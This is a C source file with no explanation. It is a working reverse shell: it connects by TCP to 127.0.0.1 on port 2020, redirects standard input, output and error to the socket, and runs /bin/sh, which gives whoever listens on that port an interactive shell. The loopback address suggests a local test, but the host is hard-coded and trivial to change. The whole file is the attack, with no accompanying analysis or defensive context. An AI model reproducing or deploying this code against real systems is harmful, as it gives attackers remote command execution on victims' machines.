#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>

int main(int argc, char** argv)
{
  int sock = -1;
  int ret = -1;
  int saved_stderr = -1;

  do
  {
    sock = socket(PF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
      perror("Failed to create socket");
      break;
    }

    struct linger linger_opts =
    {
      .l_onoff = 1,
      .l_linger = 0
    };

    ret = setsockopt(
      sock,
      SOL_SOCKET,
      SO_LINGER,
      &linger_opts,
      sizeof(linger_opts));

    if (ret < 0)
    {
      perror("Failed to setsockopt(SO_LINGER)");
      break;
    }

    int sockopt = 1;
    ret = setsockopt(
      sock,
      SOL_SOCKET,
      SO_REUSEADDR,
      &sockopt,
      sizeof(sockopt));

      if (ret < 0)
      {
        perror("Failed to setsockopt(SO_REUSEADDR)");
        break;
      }

      ret = fcntl(sock, F_GETFL, 0);
      if(ret < 0)
      {
        perror("Failed to fcntl(F_GETFL)");
        break;
      }

      ret = fcntl(sock, F_SETFL, ret | O_NONBLOCK);
      if(ret < 0)
      {
        perror("Failed to fcntl(F_SETFL)");
        break;
      }

      struct hostent *server = gethostbyname("127.0.0.1");
      int port = htons(atoi("2020"));
      struct sockaddr_in addr =
      {
        .sin_family = AF_INET,
        .sin_port = port,
      };
      memcpy(&addr.sin_addr.s_addr, server->h_addr, sizeof(addr.sin_addr.s_addr));
      ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
      if(ret < 0 && errno != EINPROGRESS)
      {
        perror("Failed to connect");
        break;
      }

      fd_set outs = {0};
      FD_ZERO(&outs);
      FD_SET(sock, &outs);
      struct timeval timest =
      {
        .tv_sec = 0,
        .tv_usec = 500000,
      };

      ret = select(
          sock + 1,
          NULL,
          &outs,
          NULL,
          &timest);

      if (ret < 0)
      {
        perror("Failed to select");
        break;
      }

      int get_ret = 0;
      unsigned int get_len = sizeof(get_ret);	/* socklen_t */

      ret = getsockopt(sock, SOL_SOCKET, SO_ERROR, &get_ret, &get_len);
      if (ret < 0)
      {
        perror("Failed to getsockopt");
        break;
      }

      if (get_ret > 0)
      {
        dprintf(STDERR_FILENO, "SO_ERROR set: %s\n", strerror(get_ret));
        break;
      }

      saved_stderr = dup(STDERR_FILENO);
      ret = dup2(sock, STDIN_FILENO);
      if (ret < 0)
      {
        dup2(saved_stderr, STDERR_FILENO);
        perror("Failed to dup2(STDIN_FILENO)");
        break;
      }

      ret = close(sock);
      if (ret < 0)
      {
        dup2(saved_stderr, STDERR_FILENO);
        perror("Failed to close(sock)");
        break;
      }

      ret = dup2(STDIN_FILENO, STDOUT_FILENO);
      if (ret < 0)
      {
        dup2(saved_stderr, STDERR_FILENO);
        perror("Failed to dup2(STDOUT_FILENO)");
        break;
      }

      ret = dup2(STDIN_FILENO, STDERR_FILENO);
      if (ret < 0)
      {
        dup2(saved_stderr, STDERR_FILENO);
        perror("Failed to dup2(STDERR_FILENO)");
        break;
      }

      ret = execl("/bin/sh", NULL);
      if (ret < 0)
      {
        dup2(saved_stderr, STDERR_FILENO);
        perror("Failed to execl");
        break;
      }

  } while(false);

  if(sock > 0)
  {
    shutdown(sock, SHUT_RDWR);
    close(sock);
    sock = -1;
  }

  dprintf(STDERR_FILENO, "DONE\n");
}
